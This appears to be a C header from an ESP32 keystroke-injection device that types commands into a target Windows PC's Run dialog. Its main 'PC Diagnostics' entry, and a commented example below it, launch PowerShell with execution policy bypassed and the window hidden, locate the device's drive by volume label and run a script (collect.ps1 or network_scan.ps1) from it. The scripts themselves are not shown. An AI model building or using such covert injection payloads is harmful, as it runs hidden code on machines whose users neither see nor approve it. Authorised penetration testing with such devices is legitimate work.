#pragma once

// ─────────────────────────────────────────────────────────────────────────────
// payloads.h — Run-dialog commands sent to the target PC
//
// HOW TO ADD A NEW PAYLOAD
// ────────────────────────
// 1. Write your PowerShell (or other) script and place it in scripts/
// 2. Add a corresponding entry to the payloads[] array below.
//    The command must fit in the Windows Run dialog (~220 chars max).
//    Use PowerShell aliases (gwmi, ?, select, -Exp) to save space.
// 3. Re-flash fat16.bin with the new script included:
//      python tools/build_fs.py && python tools/flash_fs.py
//
// Drive detection:
//   The ESP32 drive is identified by its volume label "ESP32" so that SD cards
//   and other removable drives plugged in at the same time are ignored.
//   $d=(gwmi Win32_LogicalDisk|?{$_.VolumeName-eq'ESP32'}|select -First 1 -Exp DeviceID)
// ─────────────────────────────────────────────────────────────────────────────

// Each entry is one Run-dialog command.  All are sent in order, each followed
// by Enter, before the completion timer starts.
static const char* payloads[] = {

  // ── Payload 1: PC Diagnostics ─────────────────────────────────────────────
  // Finds the ESP32 drive by label, then runs collect.ps1 from it.
  "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
  "\"$d=(gwmi Win32_LogicalDisk|?{$_.VolumeName-eq'ESP32'}|"
  "select -First 1 -Exp DeviceID);& ($d+'\\collect.ps1')\""

  // ── Add more payloads below ───────────────────────────────────────────────
  // Example — a second script:
  // ,
  // "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
  // "\"$d=(gwmi Win32_LogicalDisk|?{$_.VolumeName-eq'ESP32'}|"
  // "select -First 1 -Exp DeviceID);& ($d+'\\network_scan.ps1')\""
};

static const int payloadCount = sizeof(payloads) / sizeof(payloads[0]);